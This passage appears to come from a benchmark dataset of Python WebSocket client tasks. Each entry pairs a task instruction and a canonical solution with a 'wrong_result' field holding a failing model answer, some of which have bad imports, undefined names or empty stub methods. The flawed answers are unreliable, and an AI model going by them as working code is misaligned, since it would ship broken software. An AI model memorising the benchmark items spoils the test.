_WebSocketParams:\n    def __init__(\n        self,\n        ping_interval: Optional[float] = None,\n        ping_timeout: Optional[float] = None,\n        max_message_size: int = _default_max_message_size,\n        compression_options: Optional[Dict[str, Any]] = None,\n    ) -> None:\n        self.ping_interval = ping_interval\n        self.ping_timeout = ping_timeout\n        self.max_message_size = max_message_size\n        self.compression_options = compression_options\n\nclass WebSocketProtocol(abc.ABC):\n    def __init__(self, handler: Any) -> None:\n        self.handler = handler\n        self.stream = None\n        self.client_terminated = False\n        self.server_terminated = False\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        raise NotImplementedError()\n\n    def is_closing(self) -> bool:\n        raise NotImplementedError()\n\n    async def accept_connection(self, handler: Any) -> None:\n        raise NotImplementedError()\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        raise NotImplementedError()\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        raise NotImplementedError()\n\n    def write_ping(self, data: bytes) -> None:\n        raise NotImplementedError()\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        raise NotImplementedError()\n\n    def start_pinging(self) -> None:\n        raise NotImplementedError()\n\n    async def _receive_frame_loop(self) -> None:\n        raise NotImplementedError()\n\n    def set_nodelay(self, x: bool) -> None:\n        raise NotImplementedError()\n\nclass WebSocketProtocol13(WebSocketProtocol):\n    FIN = 0x80\n    RSV1 = 0x40\n    RSV2 = 0x20\n    RSV3 = 0x10\n    RSV_MASK = RSV1 | RSV2 | RSV3\n    OPCODE_MASK = 0x0F\n\n    def __init__(\n        self,\n        handler: Any,\n        mask_outgoing: bool,\n        params: _WebSocketParams,\n    ) -> None:\n        super().__init__(handler)\n        self.mask_outgoing = mask_outgoing\n        self.params = params\n        self._final_frame = False\n        self._frame_opcode = None\n        self._frame_mask = None\n        self._frame_length = None\n        self._fragmented_message_buffer = None\n        self._fragmented_message_opcode = None\n        self._waiting = None\n        self._compression_options = params.compression_options\n        self._decompressor = None\n        self._compressor = None\n        self._frame_compressed = None\n        self._message_bytes_in = 0\n        self._message_bytes_out = 0\n        self._wire_bytes_in = 0\n        self._wire_bytes_out = 0\n        self.ping_callback = None\n        self.last_ping = 0.0\n        self.last_pong = 0.0\n        self.close_code = None\n        self.close_reason = None\n\n    @property\n    def selected_subprotocol(self) -> Optional[str]:\n        return self._selected_subprotocol\n\n    @selected_subprotocol.setter\n    def selected_subprotocol(self, value: Optional[str]) -> None:\n        self._selected_subprotocol = value\n\n    def _process_server_headers(\n        self, key: Union[str, bytes], headers: httputil.HTTPHeaders\n    ) -> None:\n        assert headers[\"Upgrade\"].lower() == \"websocket\"\n        assert headers[\"Connection\"].lower() == \"upgrade\"\n        accept = self.compute_accept_value(key)\n        assert headers[\"Sec-Websocket-Accept\"] == accept\n\n        extensions = self._parse_extensions_header(headers)\n        for ext in extensions:\n            if ext[0] == \"permessage-deflate\" and self._compression_options is not None:\n                self._create_compressors(\"client\", ext[1])\n            else:\n                raise ValueError(\"unsupported extension %r\", ext)\n\n        self.selected_subprotocol = headers.get(\"Sec-WebSocket-Protocol\", None)\n\n    def write_message(\n        self, message: Union[str, bytes, Dict[str, Any]], binary: bool = False\n    ) -> \"Future[None]\":\n        if binary:\n            opcode = 0x2\n        else:\n            opcode = 0x1\n        if isinstance(message, dict):\n            message = tornado.escape.json_encode(message)\n        message = tornado.escape.utf8(message)\n        assert isinstance(message, bytes)\n        self._message_bytes_out += len(message)\n        flags = 0\n        if self._compressor:\n            message = self._compressor.compress(message)\n            flags |= self.RSV1\n        try:\n            fut = self._write_frame(True, opcode, message, flags=flags)\n        except StreamClosedError:\n            raise WebSocketClosedError()\n\n        async def wrapper() -> None:\n            try:\n                await fut\n            except StreamClosedError:\n                raise WebSocketClosedError()\n\n        return asyncio.ensure_future(wrapper())\n\n    def write_ping(self, data: bytes) -> None:\n        assert isinstance(data, bytes)\n        self._write_frame(True, 0x9, data)\n\n    def close(self, code: Optional[int] = None, reason: Optional[str] = None) -> None:\n        if not self.server_terminated:\n            if not self.stream.closed():\n                if code is None and reason is not None:\n                    code = 1000\n                if code is None:\n                    close_data = b\"\"\n                else:\n                    close_data = struct.pack(\">H\", code)\n                if reason is not None:\n                    close_data += utf8(reason)\n                try:\n                    self._write_frame(True, 0x8, close_data)\n                except StreamClosedError:\n                    self._abort()\n            self.server_terminated = True\n        if self.client_terminated:\n            if self._waiting is not None:\n                self.stream.io_loop.remove_timeout(self._waiting)\n                self._waiting = None\n            self.stream.close()\n        elif self._waiting is None:\n            self._waiting = self.stream.io_loop.add_timeout(\n                self.stream.io_loop.time() + 5, self._abort\n            )\n        if self.ping_callback:\n            self.ping_callback.stop()\n            self.ping_callback = None\n\n    def is_closing(self) -> bool:\n        return self.stream.closed() or self.client_terminated or self.server_terminated\n\n    def start_pinging(self) -> None:\n        if self.ping_interval is not None and self.ping_interval > 0:\n            self.last_ping = self.last_pong = IOLoop.current().time()\n            self.ping_callback = PeriodicCallback(\n                self.periodic_ping, self.ping_interval * 1000\n            )\n            self.ping_callback.start()\n\n    @staticmethod\n    def compute_accept_value(key: Union[str, bytes]) -> str:\n        sha1 = hashlib.sha1()\n        sha1.update(utf8(key))\n        sha1.update(b\"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\")\n        return native_str(base64.b64encode(sha1.digest()))\n\n    def _parse_extensions_header(\n        self, headers: httputil.HTTPHeaders\n    ) -> List[Tuple[str, Dict[str, str]]]:\n        extensions = headers.get(\"Sec-WebSocket-Extensions\", \"\")\n        if extensions:\n            return [httputil._parse_header(e.strip()) for e in extensions.split(\",\")]\n        return []\n\n    def _write_frame(\n        self, fin: bool, opcode: int, data: bytes, flags: int = 0\n    ) -> \"Future[None]\":\n        data_len = len(data)\n        if opcode & 0x8:\n            if not fin:\n                raise ValueError(\"control frames may not be fragmented\")\n            if data_len > 125:\n                raise ValueError(\"control frame payloads may not exceed 125 bytes\")\n        if fin:\n            finbit = self.FIN\n        else:\n            finbit = 0\n        frame = struct.pack(\"B\", finbit | opcode | flags)\n        if self.mask_outgoing:\n            mask_bit = 0x80\n        else:\n            mask_bit = 0\n        if data_len < 126:\n            frame += struct.pack(\"B\", data_len | mask_bit)\n        elif data_len <= 0xFFFF:\n            frame += struct.pack(\"!BH\", 126 | mask_bit, data_len)\n        else:\n            frame += struct.pack(\"!BQ\", 127 | mask_bit, data_len)\n        if self.mask_outgoing:\n            mask = os.urandom(4)\n            data = mask + _websocket_mask(mask, data)\n        frame += data\n        self._wire_bytes_out += len(frame)\n        return self.stream.write(frame)\n\ndef websocket_connect(\n    url: Union[str, httpclient.HTTPRequest],\n    callback: Optional[Callable[[\"Future[WebSocketClientConnection]\"], None]] = None,\n    connect_timeout: Optional[float] = None,\n    on_message_callback: Optional[Callable[[Union[None, str, bytes]], None]] = None,\n    compression_options: Optional[Dict[str, Any]] = None,\n    ping_interval: Optional[float] = None,\n    ping_timeout: Optional[float] = None,\n    max_message_size: int = _default_max_message_size,\n    subprotocols: Optional[List[str]] = None,\n    resolver: Optional[Resolver] = None,\n) -> \"Awaitable[WebSocketClientConnection]\":\n    if isinstance(url, httpclient.HTTPRequest):\n        assert connect_timeout is None\n        request = url\n        request.headers = httputil.HTTPHeaders(request.headers)\n    else:\n        request = httpclient.HTTPRequest(url, connect_timeout=connect_timeout)\n    request = cast(\n        httpclient.HTTPRequest,\n        httpclient._RequestProxy(request, httpclient.HTTPRequest._DEFAULTS),\n    )\n    conn = WebSocketClientConnection(\n        request,\n        on_message_callback=on_message_callback,\n        compression_options=compression_options,\n        ping_interval=ping_interval,\n        ping_timeout=ping_timeout,\n        max_message_size=max_message_size,\n        subprotocols=subprotocols,\n        resolver=resolver,\n    )\n    if callback is not None:\n        IOLoop.current().add_future(conn.connect_future, callback)\n    return conn.connect_future",
    "Code_level": "Class-level",
    "FSMID_for_test": 51,
    "wrong_result": "```python\nimport asyncio\nimport logging\nimport uuid\nfrom collections import deque\nfrom concurrent.futures import Future\nfrom tornado.concurrent import Future, is_future\nfrom tornado.escape import json_decode, json_encode\nfrom tornado.ioloop import IOLoop\nfrom tornado.tcpclient import TCPClient\nfrom tornado.websocket import WebSocketProtocol, WebSocketClientConnection, WebSocketClientHandshakeError, WebSocketError\nfrom tornado.httpclient import HTTPRequest, HTTPResponse, HTTPHeaders\nfrom tornado.httputil import RequestStartLine, ResponseStartLine\nfrom tornado.util import ObjectDict\nfrom typing import Optional, Callable, Dict, List, Union, Awaitable, Any\n\nclass WebSocketClientConnection(WebSocketClientConnection):\n    def __init__(self, request: HTTPRequest, on_message_callback: Optional[Callable], compression_options: Optional[Dict], ping_interval: Optional[float], ping_timeout: Optional[float], max_message_size: int, subprotocols: Optional[List[str]], resolver: Optional[Resolver]) -> None:\n        self.connect_future = Future()\n        self.read_queue = deque()\n        self.key = uuid.uuid4().bytes\n        self._on_message_callback = on_message_callback\n        self.close_code = None\n        self.close_reason = None\n        self.params = _WebSocketParams(\n            compression_options=compression_options,\n            ping_interval=ping_interval,\n            ping_timeout=ping_timeout,\n            max_message_size=max_message_size,\n            subprotocols=subprotocols,\n        )\n        self.tcp_client = TCPClient(resolver=resolver)\n        self.protocol = None\n        self._connect(request)\n\n    def close(self, code: Optional[int], reason: Optional[str]) -> None:\n        if self.protocol:\n            self.protocol.close(code, reason)\n        else:\n            self.connect_future.set_exception(WebSocketError(\"Connection closed before it was established\"))\n\n    def on_connection_close(self) -> None:\n        self.connect_future.set_exception(WebSocketError(\"Connection closed before it was established\"))\n\n    def on_ws_connection_close(self, close_code: Optional[int], close_reason: Optional[str]) -> None:\n        self.close_code = close_code\n        self.close_reason = close_reason\n        self.connect_future.set_result(None)\n\n    def _on_http_response(self, response: HTTPResponse) -> None:\n        if response.error:\n            self.connect_future.set_exception(WebSocketClientHandshakeError(response.error))\n        else:\n            try:\n                self.protocol = self.get_websocket_protocol()\n                self.protocol.headers_received(response.request.start_line, response.headers)\n                self.protocol.on_body(response.body)\n            except Exception as e:\n                self.connect_future.set_exception(e)\n\n    def headers_received(self, start_line: Union[RequestStartLine, ResponseStartLine], headers: HTTPHeaders) -> Awaitable[None]:\n        if isinstance(start_line, RequestStartLine):\n            self.protocol.headers_received(start_line, headers)\n        else:\n            self._on_http_response(HTTPResponse(request=self.protocol.request, start_line=start_line, headers=headers, body=b\"\"))\n\n    def write_message(self, message: Union[str, bytes, Dict[str, Any]], binary: bool) -> Future[None]:\n        if not self.protocol:\n            raise WebSocketError(\"Connection not established\")\n        if isinstance(message, dict):\n            message = json_encode(message)\n        return self.protocol.write_message(message, binary)\n\n    def read_message(self, callback: Optional[Callable]) -> Awaitable[Union[None, str, bytes]]:\n        if not self.protocol:\n            raise WebSocketError(\"Connection not established\")\n        if callback is not None:\n            self.protocol.set_read_message_callback(callback)\n        return self.protocol.read_message()\n\n    def _on_message(self, message: Union[None, str, bytes]) -> Optional[Awaitable[None]]:\n        if message is None:\n            return None\n        if self._on_message_callback is not None:\n            return self._on_message_callback(message)\n        self.read_queue.append(message)\n        return None\n\n    def ping(self, data: bytes) -> None:\n        if not self.protocol:\n            raise WebSocketError(\"Connection not established\")\n        self.protocol.ping(data)\n\n    def get_websocket_protocol(self) -> WebSocketProtocol:\n        return WebSocketProtocol(\n            self.key,\n            self.params,\n            self._on_message,\n            self.on_connection_close,\n            self.on_ws_connection_close,\n            self.headers_received,\n        )\n```\n"
  },
  {
    "Task_id": 435,
    "Instruction": "Task Description: Implement a WebSocket client using autobahn and twisted in Python to connect to a server, send a random number, receive the squared result, and then close the connection.\n\nClass Description: The WebSocketClient class establishes a WebSocket connection to a specified server, handles the communication protocol, and manages the connection lifecycle.\n\nAttributes:\n- host: str - The IP address or hostname of the WebSocket server (default: \"127.0.0.1\").\n- port: int - The port number of the WebSocket server (default: 9000).\n- factory: WebSocketClientFactory - The factory instance responsible for creating protocol instances and managing the WebSocket connection.\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket client with the specified host and port.\n- run() -> None - Connects to the WebSocket server using the reactor and starts the event loop.\n\nNested Class: SlowSquareClientProtocol(WebSocketClientProtocol) - Handles the WebSocket protocol events for the client.\n\nMethods (SlowSquareClientProtocol):\n- onOpen() -> None - Called when the WebSocket connection is established. Sends a random number to the server.\n- onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received from the server. Processes the squared result and closes the connection.\n- onClose(wasClean: bool, code: int, reason: str) -> None - Called when the WebSocket connection is closed. Stops the reactor loop.",
    "Canonical_solution": "from autobahn.twisted.websocket import WebSocketClientProtocol, WebSocketClientFactory\nimport json\nimport random\nfrom twisted.internet import reactor\n\nclass SlowSquareClientProtocol(WebSocketClientProtocol):\n    def onOpen(self):\n        x = 10. * random.random()\n        self.sendMessage(json.dumps(x).encode('utf8'))\n        print(\"Request to square {} sent.\".format(x))\n\n    def onMessage(self, payload, isBinary):\n        if not isBinary:\n            res = json.loads(payload.decode('utf8'))\n            print(\"Result received: {}\".format(res))\n            self.sendClose()\n\n    def onClose(self, wasClean, code, reason):\n        if reason:\n            print(reason)\n        reactor.stop()\n\nclass WebSocketClient:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketClientFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = SlowSquareClientProtocol\n\n    def run(self):\n        reactor.connectTCP(self.host, self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 53,
    "wrong_result": "```python\nfrom twisted.internet import reactor\nfrom twisted.web.client import WebSocketClientFactory, WebSocketClientProtocol\nimport random\n\nclass WebSocketClient:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000) -> None:\n        self.host = host\n        self.port = port\n        self.factory = WebSocketClientFactory(f\"ws://{host}:{port}/ws\")\n        self.factory.protocol = SlowSquareClientProtocol\n\n    def run(self) -> None:\n        reactor.connectTCP(self.host, self.port, self.factory)\n        reactor.run()\n\nclass SlowSquareClientProtocol(WebSocketClientProtocol):\n    def onOpen(self) -> None:\n        self.sendMessage(str(random.randint(1, 100)).encode())\n\n    def onMessage(self, payload: bytes, isBinary: bool) -> None:\n        print(f\"Received: {payload.decode()}\")\n        reactor.stop()\n\n    def onClose(self, wasClean: bool, code: int, reason: str) -> None:\n        print(f\"Connection closed: {reason}\")\n        reactor.stop()\n\nclient = WebSocketClient()\nclient.run()\n```"
  },
  {
    "Task_id": 439,
    "Instruction": "Task Description: Implement a WebSocket client class for streaming financial market data with authentication, subscription management, and message handling capabilities.\n\nClass Description: The _DataStream class establishes and maintains a WebSocket connection to a financial data streaming service. It handles authentication, manages subscriptions to different types of market data (trades, quotes, bars), processes incoming messages, and provides methods for controlling the connection lifecycle.\n\nAttributes:\n- _endpoint: str - WebSocket server URL\n- _key_id: str - API key for authentication\n- _secret_key: str - API secret for authentication\n- _ws: WebSocketClientProtocol - Active WebSocket connection\n- _running: bool - Connection status flag\n- _loop: asyncio.AbstractEventLoop - Event loop reference\n- _raw_data: bool - Flag for raw data processing\n- _stop_stream_queue: queue.Queue - Queue for stop signals\n- _handlers: Dict[str, Dict] - Dictionary of message handlers per data type\n- _name: str - Connection name identifier\n- _should_run: bool - Control flag for main loop\n- _max_frame_size: int - Maximum WebSocket frame size\n- _websocket_params: Dict - WebSocket connection parameters\n\nMethods:\n- __init__(endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None - Initialize the data stream with connection parameters\n- _connect() -> None - Establish WebSocket connection\n- _auth() -> None - Authenticate with the server\n- _start_ws() -> None - Combined connection and authentication\n- close() -> None - Close the WebSocket connection\n- stop_ws() -> None - Signal to stop the WebSocket connection\n- _consume() -> None - Main message processing loop\n- _dispatch(msg: Dict) -> None - Route messages to appropriate handlers\n- _subscribe(handler: Callable, symbols: List[str], handlers: Dict) -> None - Internal subscription management\n- _subscribe_all() -> None - Send all active subscriptions to server\n- _run_forever() -> None - Main connection management loop\n- subscribe_trades(handler: Callable, *symbols: str) -> None - Subscribe to trade data\n- subscribe_quotes(handler: Callable, *symbols: str) -> None - Subscribe to quote data\n- subscribe_bars(handler: Callable, *symbols: str) -> None - Subscribe to bar data\n- subscribe_updated_bars(handler: Callable, *symbols: str) -> None - Subscribe to updated bar data\n- subscribe_daily_bars(handler: Callable, *symbols: str) -> None - Subscribe to daily bar data\n- stop() -> None - Stop the WebSocket connection and processing",
    "Canonical_solution": "import asyncio\nimport websockets\nimport msgpack\nimport queue\nfrom typing import Dict, Optional\n\nclass _DataStream:\n    def __init__(self,\n                 endpoint: str,\n                 key_id: str,\n                 secret_key: str,\n                 raw_data: bool = False,\n                 websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws = None\n        self._running = False\n        self._loop = None\n        self._raw_data = raw_data\n        self._stop_stream_queue = queue.Queue()\n        self._handlers = {\n            'trades':      {},\n            'quotes':      {},\n            'bars':        {},\n            'updatedBars': {},\n            'dailyBars':   {},\n        }\n        self._name = 'data'\n        self._should_run = True\n        self._max_frame_size = 32768\n        self._websocket_params = websocket_params or {\n            \"ping_interval\": 10,\n            \"ping_timeout\": 180,\n            \"max_queue\": 1024,\n        }\n\n    async def _connect(self):\n        self._ws = await websockets.connect(\n            self._endpoint,\n            extra_headers={'Content-Type': 'application/msgpack'},\n            **self._websocket_params\n        )\n        r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'connected':\n            raise ValueError('connected message not received')\n\n    async def _auth(self):\n        await self._ws.send(\n            msgpack.packb({\n                'action': 'auth',\n                'key':    self._key_id,\n                'secret': self._secret_key,\n            }))\n        r = await self._ws.recv()\n        msg = msgpack.unpackb(r)\n        if msg[0]['T'] == 'error':\n            raise ValueError(msg[0].get('msg', 'auth failed'))\n        if msg[0]['T'] != 'success' or msg[0]['msg'] != 'authenticated':\n            raise ValueError('failed to authenticate')\n\n    async def _start_ws(self):\n        await self._connect()\n        await self._auth()\n\n    async def close(self):\n        if self._ws:\n            await self._ws.close()\n            self._ws = None\n            self._running = False\n\n    async def stop_ws(self):\n        self._should_run = False\n        if self._stop_stream_queue.empty():\n            self._stop_stream_queue.put_nowait({\"should_stop\": True})\n\n    async def _consume(self):\n        while True:\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                await self.close()\n                break\n            else:\n                try:\n                    r = await asyncio.wait_for(self._ws.recv(), 5)\n                    msgs = msgpack.unpackb(r)\n                    for msg in msgs:\n                        await self._dispatch(msg)\n                except asyncio.TimeoutError:\n                    pass\n\n    async def _dispatch(self, msg):\n        msg_type = msg.get('T')\n        symbol = msg.get('S')\n        if msg_type == 't':\n            handler = self._handlers['trades'].get(\n                symbol, self._handlers['trades'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'q':\n            handler = self._handlers['quotes'].get(\n                symbol, self._handlers['quotes'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'b':\n            handler = self._handlers['bars'].get(\n                symbol, self._handlers['bars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'u':\n            handler = self._handlers['updatedBars'].get(\n                symbol, self._handlers['updatedBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'd':\n            handler = self._handlers['dailyBars'].get(\n                symbol, self._handlers['dailyBars'].get('*', None))\n            if handler:\n                await handler(self._cast(msg_type, msg))\n        elif msg_type == 'error':\n            log.error(f'error: {msg.get(\"msg\")} ({msg.get(\"code\")})')\n\n    def _subscribe(self, handler, symbols, handlers):\n        for symbol in symbols:\n            handlers[symbol] = handler\n        if self._running:\n            asyncio.run_coroutine_threadsafe(\n                self._subscribe_all(), self._loop\n            ).result()\n\n    async def _subscribe_all(self):\n        msg = defaultdict(list)\n        for k, v in self._handlers.items():\n            if v:\n                for s in v.keys():\n                    msg[k].append(s)\n        msg['action'] = 'subscribe'\n        bs = msgpack.packb(msg)\n        frames = (bs[i:i+self._max_frame_size]\n                  for i in range(0, len(bs), self._max_frame_size))\n        await self._ws.send(frames)\n\n    async def _run_forever(self):\n        self._loop = asyncio.get_running_loop()\n        while not any(v for k, v in self._handlers.items()):\n            if not self._stop_stream_queue.empty():\n                self._stop_stream_queue.get(timeout=1)\n                return\n            await asyncio.sleep(0.1)\n        self._should_run = True\n        self._running = False\n        while True:\n            try:\n                if not self._should_run:\n                    return\n                if not self._running:\n                    await self._start_ws()\n                    await self._subscribe_all()\n                    self._running = True\n                await self._consume()\n            except websockets.WebSocketException as wse:\n                await self.close()\n                self._running = False\n            finally:\n                await asyncio.sleep(0.01)\n\n    def subscribe_trades(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['trades'])\n\n    def subscribe_quotes(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['quotes'])\n\n    def subscribe_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['bars'])\n\n    def subscribe_updated_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['updatedBars'])\n\n    def subscribe_daily_bars(self, handler, *symbols):\n        self._subscribe(handler, symbols, self._handlers['dailyBars'])\n\n    def stop(self):\n        if self._loop.is_running():\n            asyncio.run_coroutine_threadsafe(\n                self.stop_ws(),\n                self._loop).result()",
    "Code_level": "Class-level",
    "FSMID_for_test": 46,
    "wrong_result": "```python\nimport asyncio\nimport queue\nfrom typing import Callable, Dict, List, Optional\n\nclass _DataStream:\n    def __init__(self, endpoint: str, key_id: str, secret_key: str, raw_data: bool = False, websocket_params: Optional[Dict] = None) -> None:\n        self._endpoint = endpoint\n        self._key_id = key_id\n        self._secret_key = secret_key\n        self._ws = None\n        self._running = False\n        self._loop = asyncio.get_event_loop()\n        self._raw_data = raw_data\n        self._stop_stream_queue = queue.Queue()\n        self._handlers = {}\n        self._name = \"data_stream\"\n        self._should_run = True\n        self._max_frame_size = 10 * 1024 * 1024\n        self._websocket_params = websocket_params or {}\n\n    def _connect(self) -> None:\n        pass\n\n    def _auth(self) -> None:\n        pass\n\n    def _start_ws(self) -> None:\n        pass\n\n    def close(self) -> None:\n        pass\n\n    def stop_ws(self) -> None:\n        pass\n\n    async def _consume(self) -> None:\n        pass\n\n    def _dispatch(self, msg: Dict) -> None:\n        pass\n\n    def _subscribe(self, handler: Callable, symbols: List[str], handlers: Dict) -> None:\n        pass\n\n    def _subscribe_all(self) -> None:\n        pass\n\n    async def _run_forever(self) -> None:\n        pass\n\n    def subscribe_trades(self, handler: Callable, *symbols: str) -> None:\n        pass\n\n    def subscribe_quotes(self, handler: Callable, *symbols: str) -> None:\n        pass\n\n    def subscribe_bars(self, handler: Callable, *symbols: str) -> None:\n        pass\n\n    def subscribe_updated_bars(self, handler: Callable, *symbols: str) -> None:\n        pass\n\n    def subscribe_daily_bars(self, handler: Callable, *symbols: str) -> None:\n        pass\n\n    def stop(self) -> None:\n        pass\n```\n"
  },
  {
    "Task_id": 442,
    "Instruction": "Task Description: Implement a WebSocket client class in Python that handles WebSocket connections, message sending/receiving, and callbacks for various WebSocket events. The class should manage commands and notifications with appropriate callbacks and ensure thread-safe operations between the WebSocket thread and the main thread.\n\nClass Description: The Protocol class encapsulates WebSocket connection functionality, providing methods to connect to a WebSocket server, send commands with callbacks, subscribe/unsubscribe to notifications, and handle incoming messages. It manages thread synchronization to safely execute callbacks on the main thread.\n\nAttributes:\n- next_id: [int] - Counter for generating unique command IDs\n- commands: [dict] - Dictionary storing pending commands with their IDs as keys\n- notifications: [dict] - Dictionary storing subscribed notifications with their names as keys\n- url: [str] - WebSocket server URL to connect to\n- on_open: [function] - Callback function for WebSocket open event\n- on_close: [function] - Callback function for WebSocket close event\n- socket: [WebSocketApp] - Instance of WebSocketApp managing the connection\n\nMethods:\n- connect(url, on_open=None, on_close=None) -> [None] - Initiates a WebSocket connection to the specified URL with optional open and close callbacks. Starts a new thread for the WebSocket connection.\n- thread_callback() -> [None] - Thread procedure that sets up WebSocket callbacks and starts the connection loop.\n- send(command, callback=None, options=None) -> [None] - Sends a command through the WebSocket with an optional callback and options. Assigns a unique ID to the command.\n- subscribe(notification, callback) -> [None] - Subscribes to a notification with the specified callback.\n- unsubscribe(notification) -> [None] - Unsubscribes from a notification.\n- message_callback(ws, message) -> [None] - Handles incoming WebSocket messages, parsing them and invoking appropriate command or notification callbacks.\n- open_callback(ws) -> [None] - Handles WebSocket open event, invoking the registered on_open callback.\n- close_callback(ws) -> [None] - Handles WebSocket close event, invoking the registered on_close callback.\n- to_main_thread(f, args) -> [None] - Helper method to execute a function on the main thread with the given arguments.",
    "Canonical_solution": "import os\nimport sys\nimport json\nimport threading\nimport websocket\nimport sublime\n\nclass Protocol:\n    \"\"\"Encapsulate websocket connection\"\"\"\n\n    def __init__(self):\n        self.next_id = 0\n        self.commands = {}\n        self.notifications = {}\n\n    def connect(self, url, on_open=None, on_close=None):\n        \"\"\"Attempt to connect to the web socket\"\"\"\n        self.url = url\n        self.on_open = on_open\n        self.on_close = on_close\n        thread = threading.Thread(target=self.thread_callback)\n        thread.start()\n\n    def thread_callback(self):\n        \"\"\"Threadproc owning the socket.\n           Sets up the callbacks for open, close, and message.\n        \"\"\"\n        self.socket = websocket.WebSocketApp(\n            self.url,\n            on_message=self.message_callback,\n            on_open=self.open_callback,\n            on_close=self.close_callback\n        )\n        self.socket.run_forever()\n\n    def send(self, command, callback=None, options=None):\n        \"\"\"Send to web socket, with optional callback and options\"\"\"\n        command.id = self.next_id\n        command.callback = callback\n        command.options = options\n        self.commands[command.id] = command\n        self.next_id += 1\n        self.socket.send(json.dumps(command.request))\n\n    def subscribe(self, notification, callback):\n        \"\"\"Subscribe to notification with callback\"\"\"\n        notification.callback = callback\n        self.notifications[notification.name] = notification\n\n    def unsubscribe(self, notification):\n        \"\"\"Unsubscribe to notification\"\"\"\n        del self.notifications[notification.name]\n\n    def message_callback(self, ws, message):\n        \"\"\"Callback on any incoming packet.\n           Parse it and call matching callback.\n        \"\"\"\n        parsed = json.loads(message)\n        if 'method' in parsed:\n            if parsed['method'] in self.notifications:\n                notification = self.notifications[parsed['method']]\n                data = notification.parser(parsed['params']) if 'params' in parsed else None\n                self.to_main_thread(notification.callback, (data, notification))\n        else:\n            if parsed['id'] in self.commands:\n                command = self.commands[parsed['id']]\n                del self.commands[parsed['id']]\n                if 'error' in parsed:\n                    self.to_main_thread(print, (\"Error from debuggee: \" + parsed['error']['message'],))\n                else:\n                    command.data = command.parser(parsed['result']) if 'result' in parsed else None\n                    if command.callback:\n                        self.to_main_thread(command.callback, (command,))\n\n    def open_callback(self, ws):\n        if self.on_open:\n            self.to_main_thread(self.on_open, ())\n        print('SWI: WebSocket opened')\n\n    def close_callback(self, ws):\n        if self.on_close:\n            self.to_main_thread(self.on_close, ())\n        print('SWI: WebSocket closed')\n\n    def to_main_thread(self, f, args):\n        \"\"\"Call back on the main thread\n           to simplify the called code\n        \"\"\"\n        if f:\n            sublime.set_timeout(lambda: f(*args))",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "wrong_result": "```python\nimport threading\nimport time\nimport json\nfrom websocket import create_connection, WebSocketApp\n\nclass Protocol:\n    def __init__(self):\n        self.next_id = 0\n        self.commands = {}\n        self.notifications = {}\n        self.url = None\n        self.on_open = None\n        self.on_close = None\n        self.socket = None\n\n    def connect(self, url, on_open=None, on_close=None):\n        self.url = url\n        self.on_open = on_open\n        self.on_close = on_close\n        self.socket = WebSocketApp(url, on_message=self.message_callback, on_open=self.open_callback, on_close=self.close_callback)\n        threading.Thread(target=self.thread_callback).start()\n\n    def thread_callback(self):\n        self.socket.run_forever()\n\n    def send(self, command, callback=None, options=None):\n        command_id = self.next_id\n        self.next_id += 1\n        self.commands[command_id] = callback\n        self.socket.send(json.dumps({'command': command, 'id': command_id, 'options': options}))\n\n    def subscribe(self, notification, callback):\n        self.notifications[notification] = callback\n        self.socket.send(json.dumps({'subscribe': notification}))\n\n    def unsubscribe(self, notification):\n        del self.notifications[notification]\n        self.socket.send(json.dumps({'unsubscribe': notification}))\n\n    def message_callback(self, ws, message):\n        message = json.loads(message)\n        if 'id' in message:\n            command_id = message['id']\n            if command_id in self.commands:\n                callback = self.commands[command_id]\n                if callback:\n                    self.to_main_thread(callback, (message['result'],))\n                del self.commands[command_id]\n        elif 'notification' in message:\n            notification = message['notification']\n            if notification in self.notifications:\n                callback = self.notifications[notification]\n                if callback:\n                    self.to_main_thread(callback, (message['data'],))\n\n    def open_callback(self, ws):\n        if self.on_open:\n            self.to_main_thread(self.on_open, ())\n\n    def close_callback(self, ws):\n        if self.on_close:\n            self.to_main_thread(self.on_close, ())\n\n    def to_main_thread(self, f, args):\n        threading.Thread(target=f, args=args).start()\n```\n"
  },
  {
    "Task_id": 444,
